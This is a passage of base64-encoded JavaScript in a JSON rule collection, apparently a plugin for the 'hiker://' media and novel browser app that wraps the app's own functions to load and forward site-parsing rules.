BwYXJhbTIgIT0gbnVsbCA/IHBhcmFtMiA6IDBcXFxcbiAgICBwYXJhbTMgPSBNWV9USUNLRVRcXFxcbiAgICBwYXJhbTQgPSBldmFsXFxcXG4gICAgcmV0dXJuIG1ldGhvZF9yZXF1aXJlLmludm9rZShqYXZhQ29udGV4dCwgcGFyYW0wLCBwYXJhbTEsIHBhcmFtMiwgcGFyYW0zLCBwYXJhbTQpXFxcXG59XFxcXG5yZXF1aXJlQ2FjaGUgPSBmdW5jdGlvbihwYXJhbTAsIHBhcmFtMSwgcGFyYW0yLCBwYXJhbTMsIHBhcmFtNCwgcGFyYW01KSB7XFxcXG4gICAgaWYgKG15Q29sbF9yZXF1aXJlZFtwYXJhbTBdKSByZXR1cm5cXFxcbiAgICBteUNvbGxfcmVxdWlyZWRbcGFyYW0wXSA9IHRydWVcXFxcbiAgICBwYXJhbTMgPSBwYXJhbTMgIT0gbnVsbCA/IHBhcmFtMyA6IDBcXFxcbiAgICBwYXJhbTQgPSBNWV9USUNLRVRcXFxcbiAgICBwYXJhbTUgPSBldmFsXFxcXG4gICAgcmV0dXJuIG1ldGhvZF9yZXF1aXJlQ2FjaGUuaW52b2tlKGphdmFDb250ZXh0LCBwYXJhbTAsIHBhcmFtMSwgcGFyYW0yLCBwYXJhbTMsIHBhcmFtNCwgcGFyYW01KVxcXFxufVxcXFxucmMgPSByZXF1aXJlQ2FjaGVcXFxcbi8vIOacgOaWsOeroOiKguinhOWImeeOr+Wig+WKq+aMgVxcXFxuc2V0TGFzdENoYXB0ZXJSdWxlID0gZnVuY3Rpb24ocGFyYW0wKSB7XFxcXG4gICAgaWYgKHBhcmFtMC5zdGFydHNXaXRoKFxcXFxcXFwianM6XFxcXFxcXCIpKSB7XFxcXG4gICAgICAgIHBhcmFtMCA9ICdqczonICsgJC50b1N0cmluZygoUUlOR19USVRMRSwgTVlfUEFSQU1TKSA9PiB7XFxcXG4gICAgICAgICAgICBldmFsKEpTT04ucGFyc2UoZmV0Y2goJ2hpa2VyOi8vcGFnZS9oaWphY2tFbnY/cnVsZT0nICsgUUlOR19USVRMRSkpLnJ1bGUpXFxcXG4gICAgICAgICAgICB2YXIgeyBydW5QcmVSdWxlIH0gPSAkLnJlcXVpcmUoJ2hpa2VyOi8vcGFnZS9mdW5jVG9vbHM/cnVsZT0nICsgUUlOR19USVRMRSlcXFxcbiAgICAgICAgICAgIHJ1blByZVJ1bGUob3JpUlVMRS5wcmVSdWxlKVxcXFxuICAgICAgICB9LCBRSU5HX1RJVExFLCB7IHVybDogTVlfUlVMRS51cmwsIFJVTEU6IGJhc2U2NEVuY29kZShKU09OLnN0cmluZ2lmeShnZW5NeVJ1bGUoKSkpLCBpc0luZGV4OiBpc0luZGV4IH0pICsgJzsnICsgcGFyYW0wLnNsaWNlKDMpXFxcXG4gICAgfVxcXFxuICAgIG1ldGhvZF9zZXRMYXN0Q2hhcHRlclJ1bGUuaW52b2tlKGphdmFDb250ZXh0LCBwYXJhbTApXFxcXG59XFxcXG4vLyDliqjmgIHmlrDlop7lh73mlbDliqvmjIFcXFxcbmFkZEl0ZW1BZnRlciA9IGZ1bmN0aW9uKHBhcmFtMCwgcGFyYW0xKSB7XFxcXG4gICAgaWYgKEFycmF5LmlzQXJyYXkocGFyYW0xKSkgcGFyYW0xID0gcGFyYW0xLm1hcChoaWphY2tFbClcXFxcbiAgICBlbHNlIHBhcmFtMSA9IGhpamFja0VsKHBhcmFtMSlcXFxcbiAgICBtZXRob2RfYWRkSXRlbUFmdGVyLmludm9rZShqYXZhQ29udGV4dCwgcGFyYW0wLCBwYXJhbTEpXFxcXG59XFxcXG5hZGRJdGVtQmVmb3JlID0gZnVuY3Rpb24ocGFyYW0wLCBwYXJhbTEpIHtcXFxcbiAgICBpZiAoQXJyYXkuaXNBcnJheShwYXJhbTEpKSBwYXJhbTEgPSBwYXJhbTEubWFwKGhpamFja0VsKVxcXFxuICAgIGVsc2UgcGFyYW0xID0gaGlqYWNrRWwocGFyYW0xKVxcXFxuICAgIG1ldGhvZF9hZGRJdGVtQmVmb3JlLmludm9rZShqYXZhQ29udGV4dCwgcGFyYW0wLCBwYXJhbTEpXFxcXG59XFxcXG5cXFwifSx7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCLlh73mlbDlt6XlhbdcXFwiLFxcXCJwYXRoXFxcIjpcXFwiZnVuY1Rvb2xzXFxcIixcXFwicnVsZVxcXCI6XFxcImxldCB7IFFJTkdfVElUTEUsIE1ZX1JVTEUsIGlzSW5kZXggfSA9ICQuaW1wb3J0UGFyYW1cXFxcbmlmICghTVlfUlVMRSkgTVlfUlVMRSA9IHt9XFxcXG5cXFxcbmZ1bmN0aW9uIHJ1bkNvZGUocnVsZSkge1xcXFxuICAgIHRyeSB7XFxcXG4gICAgICAgIGxldCBbaW5wdXQsIGNvZGVdID0gcnVsZS5zcGxpdCgnLmpzOicpXFxcXG4gICAgICAgIHJldHVybiBjb2RlID8gZXZhbChjb2RlKSA6IHJ1bGVcXFxcbiAgICB9IGNhdGNoIChlKSB7IHJldHVybiBydWxlIH1cXFxcbn1cXFxcbi8vIOmmlumhtemTvuaOpeabv+aNouWIhuexu1xcXFxuZnVuY3Rpb24gaW5kZXhVcmwocGFyYW0pIHtcXFxcbiAgICBNWV9SVUxFID0gSlNPTi5wYXJzZShiYXNlNjREZWNvZGUoTVlfUlVMRSkpXFxcXG4gICAgbGV0IHBhZ2VOdW0gPSBwYXJzZUludChwYXJhbS5zcGxpdCgnIyMjJylbMV0pLFxcXFxuICAgICAgICB1cmwgPSBNWV9SVUxFLnVybCxcXFxcbiAgICAgICAgeyBmeUFsbCwgdGFiSGVhZGVyIH0gPSAkLnJlcXVpcmUoJ2hpa2VyOi8vcGFnZS9DbGFzc1RhYj9ydWxlPScgKyBRSU5HX1RJVExFLCBPYmplY3QuYXNzaWduKHsgUUlOR19USVRMRTogUUlOR19USVRMRSB9LCBNWV9SVUxFKSlcXFxcblxcXFxuICAgIHVybCA9IHRhYkhlYWRlci5zZXRVcmwoZnlBbGwgPyB1cmwucmVwbGFjZSgvZnlBbGwvZywgJyQke2Z5QWxsfScpIDogdXJsLnJlcGxhY2UoL2Z5KGNsYXNzfGFyZWF8eWVhcnxzb3J0KS9nLCAnJCR7ZnkkMX0nKSlcXFxcbiAgICB1cmwgPSB1cmwucmVwbGFjZSgvZnlwYWdlKD86QCgtP1xcXFxcXFxcZCspQCk/KD86XFxcXFxcXFwqKFxcXFxcXFxcZCspQCk/L2csIChfLCBzdGFydCwgc3BhY2UpID0+IHBhcnNlSW50KHN0YXJ0IHx8IDApICsgMSArIChwYWdlTnVtIC0gMSkgKiBwYXJzZUludChzcGFjZSB8fCAxKSlcXFxcbiAgICB1cmwgPSAvXihbXFxcXFxcXFxzXFxcXFxcXFxTXSo/KSg/OlxcXFxcXFxcW2ZpcnN0UGFnZT0oW1xcXFxcXFxcc1xcXFxcXFxcU10qPylcXFxcXFxcXF0pPyg/OihcXFxcXFxcXC5qczpbXFxcXFxcXFxzXFxcXFxcXFxTXSo/KSk/JC8uZXhlYyh1cmwpXFxcXG4gICAgaWYgKHBhZ2VOdW0gPT0gMSAmJiB1cmxbMl0pIHVybFsxXSA9IHVybFsyXVxcXFxuICAgIGlmICh1cmxbM10gJiYgIXVybFsxXS5pbmNsdWRlcygnLmpzOicpKSB1cmxbMV0gKz0gdXJsWzNdXFxcXG4gICAgcmV0dXJuIHJ1bkNvZGUodXJsWzFdKVxcXFxufVxcXFxuXFxcXG5mdW5jdGlvbiBwYXJhbUhhbmRsZSh1cmxQYXJhbSwgdWEsIHVybFRtcCkge1xcXFxuICAgIGxldCBjaGFyc2V0LCBwYXJhbVRtcFxcXFxuICAgIHRyeSB7IC8vIOmTvuaOpeeahOe8lueggeOAgVVB5ZKMUmVmZXJlcuW6lOivpeaYr+mmluWFiOe7p+aJv+mmlumhtemTvuaOpVxcXFxuICAgICAgICBbLCAsIGNoYXJzZXQsIHBhcmFtVG1wXSA9IHVybFRtcC5zcGxpdCgnOycpXFxcXG4gICAgICAgIHBhcmFtVG1wID0gcGFyYW1UbXAubWF0Y2goL157KC4qKX0kLylbMV0uc3BsaXQoJyYmJylcXFxcbiAgICB9IGNhdGNoIChlKSB7IHBhcmFtVG1wID0gW10gfVxcXFxuICAgIGxldCBVc2VyQWdlbnQgPSBwYXJhbVRtcC5maW5kKCh2KSA9PiB2LnN0YXJ0c1dpdGgoJ1VzZXItQWdlbnRAJykpLFxcXFxuICAgICAgICBSZWZlcmVyID0gcGFyYW1UbXAuZmluZCgodikgPT4gdi5zdGFydHNXaXRoKCdSZWZlcmVyQCcpKVxcXFxuICAgIHVybFBhcmFtWzBdID0gdXJsUGFyYW1bMF0gfHwgJ0dFVCdcXFxcbiAgICB1cmxQYXJhbVsxXSA9IHVybFBhcmFtWzFdIHx8IGNoYXJzZXQgfHwgJ1VURi04J1xcXFxuICAgIHRyeSB7XFxcXG4gICAgICAgIHVybFBhcmFtWzJdID0gdXJsUGFyYW1bMl0ubWF0Y2goL157KC4qKX0kLylbMV0uc3BsaXQoJyYmJylcXFxcbiAgICB9IGNhdGNoIChlKSB7IHVybFBhcmFtWzJdID0gW10gfVxcXFxuICAgIC8vIOa3u+WKoOWFqOWxgFVB5ZKM5LiK57qnUmVmZXJlclxcXFxuICAgIGlmICghdXJsUGFyYW1bMl0uc29tZSgodikgPT4gdi5zdGFydHNXaXRoKCdVc2VyLUFnZW50QCcpKSkge1xcXFxuICAgICAgICBpZiAoVXNlckFnZW50KSB1cmxQYXJhbVsyXS5wdXNoKFVzZXJBZ2VudClcXFxcbiAgICAgICAgZWxzZSBpZiAodWEgPT0gJ3BjJylcXFxcbiAgICAgICAgICAgIHVybFBhcmFtWzJdLnB1c2goJ1VzZXItQWdlbnRAJyArIFBDX1VBLnJlcGxhY2UoLzsvZywgJ++8m++8mycpLnJlcGxhY2UoL1xcXFxcXFxcPy8sICfvvJ/vvJ8nKSlcXFxcbiAgICAgICAgZWxzZSBpZiAodWEgPT0gJ21vYmlsZScpXFxcXG4gICAgICAgICAgICB1cmxQYXJhbVsyXS5wdXNoKCdVc2VyLUFnZW50QCcgKyBNT0JJTEVfVUEucmVwbGFjZSgvOy9nLCAn77yb77ybJykucmVwbGFjZSgvXFxcXFxcXFw/LywgJ++8n++8nycpKVxcXFxuICAgIH1cXFxcbiAgICBpZiAoUmVmZXJlciAmJiAhdXJsUGFyYW1bMl0uc29tZSgodikgPT4gdi5zdGFydHNXaXRoKCdSZWZlcmVyQCcpKSlcXFxcbiAgICAgICAgdXJsUGFyYW1bMl0ucHVzaChSZWZlcmVyKVxcXFxuICAgIHVybFBhcmFtWzJdID0gJ3snICsgdXJsUGFyYW1bMl0uam9pbignJiYnKSArICd9J1xcXFxuICAgIHJldHVybiB1cmxQYXJhbS5qb2luKCc7JylcXFxcbn1cXFxcbi8vIOmihOWkhOeQhuW5tuWIneWni+WMlmNvbmZpZ1xcXFxuZnVuY3Rpb24gcnVuUHJlUnVsZShydWxlKSB7XFxcXG4gICAgaWYgKCh0eXBlb2YgTVlfUEFHRSAhPSAndW5kZWZpbmVkJyAmJiAgTVlfUEFHRSA9PSAxKSAmJlxcXFxuICAgICAgICAgKGlzSW5kZXggfHwgIWdldE15VmFyKCckcHJlUnVsZV8nICsgTVlfUlVMRS50aXRsZSkpKSB7XFxcXG4gICAgICAgIGV2YWwocnVsZSlcXFxcbiAgICAgICAgcHV0TXlWYXIoJyRwcmVSdWxlXycgKyBNWV9SVUxFLnRpdGxlLCAnVCcpXFxcXG4gICAgfVxcXFxuICAgIGxldCBfY2ZnID0gZ2V0TXlWYXIoJ2luaXRDb25maWcnLCAne30nKVxcXFxuICAgIGlmIChfY2ZnICYmIF9jZmcubGVuZ3RoID4gMCkge1xcXFxuICAgICAgICBjb25maWcgPSBKU09OLnBhcnNlKF9jZmcpXFxcXG4gICAgfVxcXFxufVxcXFxuLy8g5q2j5paH6Kej5p6Q6YCa55So5Y+Y6YePXFxcXG5mdW5jdGlvbiBnZW5NeVJ1bGUoKSB7XFxcXG4gICAgbGV0IFJVTEUgPSBPYmplY3QuYXNzaWduKHt9LCBNWV9SVUxFKVxcXFxuICAgIGRlbGV0ZSBSVUxFLmxhc3RfY2hhcHRlcl9ydWxlXFxcXG4gICAgZGVsZXRlIFJVTEUucHJlUnVsZVxcXFxuICAgIGRlbGV0ZSBSVUxFLnBhZ2VMaXN0XFxcXG4gICAgZGVsZXRlIFJVTEUucGFnZXNcXFxcbiAgICByZXR1cm4gUlVMRVxcXFxufVxcXFxuXFxcXG5mdW5jdGlvbiBnZW5FeFVybCh1cmwpIHtcXFxcbiAgICB1cmwgPSB1cmwuc3BsaXQoJzsnKVxcXFxuICAgIHJldHVybiB1cmwuc2hpZnQoKSArICc7JyArIHBhcmFtSGFuZGxlKHVybCwgTVlfUlVMRS51YSwgTVlfUlVMRS51cmwpXFxcXG59XFxcXG5cXFxcbmhpamFja0xhenlSdWxlID0gJC50b1N0cmluZygoUUlOR19USVRMRSwgTVlfUEFSQU1TKSA9PiB7XFxcXG4gICAgaWYgKCFNWV9SVUxFKSBNWV9SVUxFID0ge31cXFxcbiAgICBNWV9QQVJBTVMgPSBKU09OLnBhcnNlKGJhc2U2NERlY29kZShNWV9QQVJBTVMpKVxcXFxuICAgIGV2YWwoSlNPTi5wYXJzZShmZXRjaCgnaGlrZXI6Ly9wYWdlL2hpamFja0Vudj9ydWxlPScgKyBRSU5HX1RJVExFKSkucnVsZSlcXFxcbiAgICB2YXIge1xcXFxuICAgICAgICBwYXJhbUhhbmRsZSxcXFxcbiAgICAgICAgZ2VuRXhVcmwsXFxcXG4gICAgICAgIGhpamFja0xhenlSdWxlLFxcXFxuICAgICAgICBoaWphY2tFbFxcXFxuICAgIH0gPSAkLnJlcXVpcmUoJ2hpa2VyOi8vcGFnZS9mdW5jVG9vbHM/cnVsZT0nICsgUUlOR19USVRMRSlcXFxcbn0sIFFJTkdfVElUTEUsIGJhc2U2NEVuY29kZShKU09OLnN0cmluZ2lmeSh7IHVybDogTVlfUlVMRS51cmwsIFJVTEU6IGJhc2U2NEVuY29kZShKU09OLnN0cmluZ2lmeShnZW5NeVJ1bGUoKSkpLCBpc0luZGV4OiBpc0luZGV4IH0pKSlcXFxcblxcXFxuZnVuY3Rpb24gaGlqYWNrRWwoZWwpIHtcXFxcbiAgICBpZighZWwgfHwgdHlwZW9mIGVsICE9ICdvYmplY3QnKSByZXR1cm5cXFxcbiAgICBpZiAoIWVsLmV4dHJhKSBlbC5leHRyYSA9IHt9XFxcXG4gICAgZWwuY29sX3R5cGUgPSBlbC5jb2xfdHlwZSB8fCBNWV9SVUxFLmNvbF90eXBlXFxcXG4gICAgbGV0IE5PV19SVUxFID0gT2JqZWN0LmFzc2lnbihnZW5NeVJ1bGUoKSwgeyBwYXJhbXM6IGVsLmV4dHJhIH0pXFxcXG5cXFxcbiAgICBpZiAodHlwZW9mIGVsLnVybCAhPSAnc3RyaW5nJyB8fFxcXFxuICAgICAgICBbJ3g1X3dlYnZpZXdfc2luZ2xlJywgJ2lucHV0J10uc29tZSgodikgPT4gZWwuY29sX3R5cGUgPT0gdikgfHxcXFxcbiAgICAgICAgWyfmtbfpmJTop4bnlYwnLCAnamF2YXNjcmlwdDonXS5zb21lKCh2KSA9PiBlbC51cmwuc3RhcnRzV2l0aCh2KSkgfHxcXFxcbiAgICAgICAgWydydWxlJywgJ3BpY3MnLCAndG9hc3QnLCAnY29weScsICdlZGl0RmlsZScsICd4NScsICd4NVdlYlZpZXcnLCAneDVQbGF5JywgJ3dlYicsICd4NVJ1bGUnLCAnd2ViUnVsZScsXFxcXG4gICAgICAgICAgICAnZG93bmxvYWQnLCAnc2hhcmUnLCAnZmlsZVNlbGVjdCcsICd2aWRlbyddLnNvbWUoKHYpID0+IGVsLnVybC5zdGFydHNXaXRoKHYgKyAnOi8vJykpKSB7XFxcXG4gICAgICAgIHJldHVybiBlbFxcXFxuICAgIH0gZWxzZSBpZiAoZWwudXJsLnN0YXJ0c1dpdGgoJ2lucHV0Oi8vJykpIHtcXFxcbiAgICAgICAgbGV0IHBhcmEgPSBKU09OLnBhcnNlKGVsLnVybC5zbGljZSg4KSlcXFxcbiAgICAgICAgaWYgKHBhcmEuanMpIHBhcmEuanMgPSBoaWphY2tMYXp5UnVsZSArICc7JyArIHBhcmEuanNcXFxcbiAgICAgICAgZWwudXJsID0gJ2lucHV0Oi8vJyArIEpTT04uc3RyaW5naWZ5KHBhcmEpXFxcXG4gICAgICAgIHJldHVybiBlbFxcXFxuICAgIH0gZWxzZSBpZiAoZWwudXJsLnN0YXJ0c1dpdGgoJ2NvbmZpcm06Ly8nKSkge1xcXFxuICAgICAgICBsZXQgcmVJbmRleCA9IGVsLnVybC5pbmRleE9mKCcuanM6JylcXFxcbiAgICAgICAgaWYgKHJlSW5kZXggPj0gMCkgZWwudXJsID0gZWwudXJsLnNsaWNlKDAsIHJlSW5kZXgpICsgJy5qczonICsgaGlqYWNrTGF6eVJ1bGUgKyAnOycgKyBlbC51cmwuc2xpY2UocmVJbmRleCArIDQpXFxcXG4gICAgICAgIHJldHVybiBlbFxcXFxuICAgIH0gZWxzZSBpZiAoZWwudXJsLnN0YXJ0c1dpdGgoJ3NlbGVjdDovLycpKSB7XFxcXG4gICAgICAgIGxldCBwYXJhID0gSlNPTi5wYXJzZShlbC51cmwuc2xpY2UoOSkpXFxcXG4gICAgICAgIGlmIChwYXJhLmpzKSBwYXJhLmpzID0gaGlqYWNrTGF6eVJ1bGUgKyAnOycgKyBwYXJhLmpzXFxcXG4gICAgICAgIGVsLnVybCA9ICdzZWxlY3Q6Ly8nICsgSlNPTi5zdHJpbmdpZnkocGFyYSlcXFxcbiAgICAgICAgcmV0dXJuIGVsXFxcXG4gICAgfSBlbHNlIGlmIChlbC51cmwuaW5jbHVkZXMoJ0BydWxlPScpKSB7XFxcXG4gICAgICAgIGxldCBbXywgdXJsLCBydWxlXSA9IGVsLnVybC5tYXRjaCgvXihbXFxcXFxcXFxzXFxcXFxcXFxTXSo/KUBydWxlPShbXFxcXFxcXFxzXFxcXFxcXFxTXSopJC8pXFxcXG4gICAgICAgIGVsLnVybCA9IHVybFxcXFxuICAgICAgICBOT1dfUlVMRS5kZXRhaWxfZmluZF9ydWxlID0gcnVsZVxcXFxuICAgICAgICBOT1dfUlVMRS5kZXRhaWxfY29sX3R5cGUgPSBNWV9SVUxFLmNvbF90eXBlXFxcXG4gICAgfSBlbHNlIGlmIChlbC51cmwuc3RhcnRzV2l0aCgnaGlrZXI6Ly9wYWdlLycpKSB7XFxcXG4gICAgICAgIGlmIChlbC51cmwuaW5jbHVkZXMoJ3J1bGU9JykgfHwgZWwuZXh0cmEucnVsZSlcXFxcbiAgICAgICAgICAgIHJldHVybiBlbFxcXFxuICAgICAgICBsZXQgW18sIHBhdGgsIGZsYWcsIHBhcmFtc10gPSBlbC51cmwubWF0Y2goL15oaWtlcjpcXFxcXFxcXC9cXFxcXFxcXC9wYWdlXFxcXFxcXFwvKC4rPykoIy4qPyk/KD86XFxcXFxcXFw/KC4qKSk/JC8pLFxcXFxuICAgICAgICAgICAgc3ViUGFnZSA9IE1ZX1JVTEUucGFnZUxpc3QuZmluZCgodikgPT4gdi5wYXRoID09IHBhdGgpLFxcXFxuICAgICAgICAgICAgc3ViVXJsID0gKHBhcmFtcyB8fCAnJykuc3BsaXQoJyYnKS5maW5kKCh2KSA9PiB2LnN0YXJ0c1dpdGgoJ3VybD0nKSlcXFxcbiAgICAgICAgZWwudXJsID0gKHN1YlVybCA/IHN1YlVybC5zbGljZSg0KS5yZXBsYWNlKC/vvJ/vvJ8vZywgJz8nKS5yZXBsYWNlKC/vvIbvvIYvZywgJyYnKSA6IChlbC5leHRyYSB8fCB7fSkudXJsKSB8fCAnaGlrZXI6Ly9lbXB0eScgKyBmbGFnICsgJz8nICsgKHBhcmFtcyB8fCAnJylcXFxcbiAgICAgICAgTk9XX1JVTEUuZGV0YWlsX2ZpbmRfcnVsZSA9IHN1YlBhZ2UucnVsZVxcXFxuICAgICAgICBOT1dfUlVMRS5kZXRhaWxfY29sX3R5cGUgPSBzdWJQYWdlLmNvbF90eXBlXFxcXG4gICAgfSBlbHNlIGlmIChlbC51cmwuaW5jbHVkZXMoJ0BsYXp5UnVsZT0nKSkge1xcXFxuICAgICAgICBsZXQgcmVJbmRleCA9IGVsLnVybC5pbmRleE9mKCcuanM6JylcXFxcbiAgICAgICAgaWYgKHJlSW5kZXggPj0gMCkgZWwudXJsID0gZWwudXJsLnNsaWNlKDAsIHJlSW5kZXgpICsgJy5qczonICsgaGlqYWNrTGF6eVJ1bGUgKyAnOycgKyBlbC51cmwuc2xpY2UocmVJbmRleCArIDQpXFxcXG4gICAgICAgIHJldHVybiBlbFxcXFxuICAgIH0gZWxzZSBpZiAoaXNJbmRleCkge1xcXFxuICAgICAgICBpZiAoIU1ZX1JVTEUuZGV0YWlsX2ZpbmRfcnVsZSB8fCAvaGlrZXI6XFxcXFxcXFwvXFxcXFxcXFwvKD8hZW1wdHkuKyQpLy50ZXN0KGVsLnVybCkpIHJldHVybiBlbFxcXFxuICAgIH0gZWxzZSB7XFxcXG4gICAgICAgIHJldHVybiBlbFxcXFxuICAgIH1cXFxcbiAgICBlbC5leHRyYSA9IE9iamVjdC5hc3NpZ24oe30sIGVsLmV4dHJhLCB7XFxcXG4gICAgICAgIHVybDogZ2VuRXhVcmwoZWwudXJsKSxcXFxcbiAgICAgICAgUlVMRTogYmFzZTY0RW5jb2RlKEpTT04uc3RyaW5naWZ5KE5PV19SVUxFKSksXFxcXG4gICAgICAgIHBhZ2VUaXRsZTogaXNJbmRleCAmJiBlbC50aXRsZVxcXFxuICAgIH0pXFxcXG4gICAgZWwudXJsID0gJ2hpa2VyOi8vcGFnZS9mcmFtZUxvYWQ/cnVsZT0nICsgUUlOR19USVRMRVxcXFxuICAgIHJldHVybiBlbFxcXFxufVxcXFxuJC5leHBvcnRzID0ge1xcXFxuICAgIHJ1bkNvZGU6IHJ1bkNvZGUsXFxcXG4gICAgaW5kZXhVcmw6IGluZGV4VXJsLFxcXFxuICAgIHBhcmFtSGFuZGxlOiBwYXJhbUhhbmRsZSxcXFxcbiAgICBydW5QcmVSdWxlOiBydW5QcmVSdWxlLFxcXFxuICAgIGdlbk15UnVsZTogZ2VuTXlSdWxlLFxcXFxuICAgIGdlbkV4VXJsOiBnZW5FeFVybCxcXFxcbiAgICBoaWphY2tMYXp5UnVsZTogaGlqYWNrTGF6eVJ1bGUsXFxcXG4gICAgaGlqYWNrRWw6IGhpamFja0VsXFxcXG59XFxcXG5cXFwifSx7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCLpobXpnaLovb3lhaVcXFwiLFxcXCJwYXRoXFxcIjpcXFwiZnJhbWVMb2FkXFxcIixcXFwicnVsZVxcXCI6XFxcImpzOlxcXFxuY29uc3QgUUlOR19USVRMRSA9IGdldE15VmFyKCdteUNvbGxlY3Rpb24nKVxcXFxudmFyIG15Q29sbF9lbCA9IFtdXFxcXG5ldmFsKEpTT04ucGFyc2UoZmV0Y2goJ2hpa2VyOi8vcGFnZS9oaWphY2tFbnY/cnVsZT0nICsgUUlOR19USVRMRSkpLnJ1bGUpXFxcXG5cXFxcbmlmICghaXNJbmRleCkge1xcXFxuICAgIGlmIChwYWdlVGl0bGUpIHNldFBhZ2VUaXRsZShwYWdlVGl0bGUpXFxcXG4gICAgc2V0TGFzdENoYXB0ZXJSdWxlKG9yaVJVTEUubGFzdF9jaGFwdGVyX3J1bGUpXFxcXG4gICAgTVlfUEFSQU1TID0gTVlfUlVMRS5wYXJhbXNcXFxcbn0gZWxzZSBpZiAoTVlfUEFHRSA9PSAxKSB7XFxcXG4gICAgdGFiSGVhZGVyLmxvYWQobXlDb2xsX2VsKVxcXFxuICAgIGlmIChSVUxFLnNlYXJjaF91cmwpIG15Q29sbF9lbC5wdXNoKHtcXFxcbiAgICAgICAgdGl0bGU6IFxcXFxcXFwi5pCc57SiXFxcXFxcXCIsXFxcXG4gICAgICAgIGRlc2M6IFxcXFxcXFwi6L+Z5piv6ZiF5Yqo5ryr55qE5pCc57Si5ZOmfn5cXFxcXFxcIixcXFxcbiAgICAgICAgdXJsOiAnXFxcXFxcXCJoaWtlcjovL3NlYXJjaD9zPVxcXFxcXFwiK2lucHV0JyxcXFxcbiAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgIHJ1bGVzOiAkLnRvU3RyaW5nKChRSU5HX1RJVExFLCB0aXRsZSkgPT4ge1xcXFxuICAgICAgICAgICAgICAgIGxldCBydWxlcyA9ICQucmVxdWlyZSgnaGlrZXI6Ly9wYWdlL2RhdGFMb2FkP3J1bGU9JyArIFFJTkdfVElUTEUpXFxcXG4gICAgICAgICAgICAgICAgcnVsZXMgPSBbcnVsZXMuZmluZCgodikgPT4gdi50aXRsZSA9PSB0aXRsZSldXFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIEpTT04uc3RyaW5naWZ5KHJ1bGVzKVxcXFxuICAgICAgICAgICAgfSwgUUlOR19USVRMRSwgUlVMRS50aXRsZSksXFxcXG4gICAgICAgICAgICBkZWZhdWx0VmFsdWU6IGdldE15VmFyKCdzZWFyY2hLZXknLCAnJyksXFxcXG4gICAgICAgICAgICBvbkNoYW5nZTogXFxcXFxcXCJwdXRNeVZhcignc2VhcmNoS2V5JyxpbnB1dClcXFxcXFxcIlxcXFxuICAgICAgICB9LFxcXFxuICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJpbnB1dFxcXFxcXFwiLFxcXFxuICAgIH0pXFxcXG59XFxcXG4vLyDmraPmlofop6PmnpBcXFxcbnZhciB7XFxcXG4gICAgcGFyYW1IYW5kbGUsXFxcXG4gICAgcnVuUHJlUnVsZSxcXFxcbiAgICBnZW5FeFVybCxcXFxcbiAgICBoaWphY2tMYXp5UnVsZVxcXFxufSA9ICQucmVxdWlyZSgnaGlrZXI6Ly9wYWdlL2Z1bmNUb29scz9ydWxlPScgKyBRSU5HX1RJVExFKVxcXFxucnVuUHJlUnVsZShvcmlSVUxFLnByZVJ1bGUpXFxcXG5pZiAoTVlfUlVMRS5maW5kX3J1bGUuc3RhcnRzV2l0aCgnanM6JykpIHtcXFxcbiAgICBsZXQgeyBoaWphY2tFbCB9ID0gJC5yZXF1aXJlKCdoaWtlcjovL3BhZ2UvZnVuY1Rvb2xzP3J1bGU9JyArIFFJTkdfVElUTEUpXFxcXG4gICAgc2V0UmVzdWx0ID0gZnVuY3Rpb24ocGFyYW0wLCBwYXJhbTEsIHBhcmFtMiwgcGFyYW0zKSB7XFxcXG4gICAgICAgIHBhcmFtMSA9IENBTExCQUNLX0tFWVxcXFxuICAgICAgICBwYXJhbTIgPSBNWV9SVUxFXFxcXG4gICAgICAgIHBhcmFtMyA9IE1ZX1RZUEVcXFxcbiAgICAgICAgaWYgKEFycmF5LmlzQXJyYXkocGFyYW0wLmRhdGEpKSBwYXJhbTAgPSBwYXJhbTAuZGF0YVxcXFxuICAgICAgICBBcnJheS5wcm90b3R5cGUucHVzaC5hcHBseShteUNvbGxfZWwsIHBhcmFtMC5tYXAoaGlqYWNrRWwpKVxcXFxuICAgICAgICBtZXRob2Rfc2V0UmVzdWx0Lmludm9rZShqYXZhQ29udGV4dCwgbXlDb2xsX2VsLCBwYXJhbTEsIHBhcmFtMiwgcGFyYW0zKVxcXFxuICAgIH1cXFxcbiAgICBzZXRIb21lUmVzdWx0ID0gc2V0UmVzdWx0XFxcXG4gICAgc2V0U2VhcmNoUmVzdWx0ID0gc2V0UmVzdWx0XFxcXG5cXFxcbiAgICBldmFsKE1ZX1JVTEUuZmluZF9ydWxlLnNsaWNlKDMpKVxcXFxufSBlbHNlIHtcXFxcbiAgICBsZXQgeyBydW5Db2RlIH0gPSAkLnJlcXVpcmUoJ2hpa2VyOi8vcGFnZS9mdW5jVG9vbHM/cnVsZT0nICsgUUlOR19USVRMRSksXFxcXG4gICAgICAgIFtfLCBmaW5kUnVsZSwgZGV0YWlsRmluZFJ1bGVdID0gTVlfUlVMRS5maW5kX3J1bGUubWF0Y2goL14oW1xcXFxcXFxcc1xcXFxcXFxcU10qPykoPzo9PT4oW1xcXFxcXFxcc1xcXFxcXFxcU10qKSk/JC8pXFxcXG4gICAgZmluZFJ1bGUgPSBmaW5kUnVsZS5zcGxpdCgnOycpXFxcXG4gICAgcGFyc2VEb21Gb3JBcnJheShnZXRSZXNDb2RlKCksIGZpbmRSdWxlLnNoaWZ0KCkpLmZvckVhY2goKGRhdGEpID0+IHtcXFxcbiAgICAgICAgbGV0IFt0aXRsZSwgaW1nLCBkZXNjLCB1cmxdID0gZmluZFJ1bGUubWFwKCh2LCBpKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgdHJ5IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgaWYgKHYgPT0gJyonKSByZXR1cm4gJydcXFxcbiAgICAgICAgICAgICAgICAgICAgZWxzZSB2ID0gKGkgPT0gMSB8fCBpID09IDMpID9cXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHBhcnNlRG9tKGRhdGEsIHYpIDpcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHBhcnNlRG9tRm9ySHRtbChkYXRhLCB2KVxcXFxuICAgICAgICAgICAgICAgICAgICBpZiAoaSAhPSAzKSB2ID0gcnVuQ29kZSh2KVxcXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gdlxcXFxuICAgICAgICAgICAg